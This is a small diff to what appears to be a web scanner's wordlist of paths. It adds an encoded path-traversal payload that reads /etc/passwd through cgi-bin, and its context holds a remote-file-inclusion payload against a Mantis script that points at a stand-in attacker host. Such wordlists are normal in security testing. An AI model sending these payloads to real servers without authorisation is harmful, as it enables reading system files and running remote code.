@@ -11703,6 +11703,7 @@ manifesto
 mannheim
 mansion
 mantenimiento
+cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 mantis
 mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F
 manu
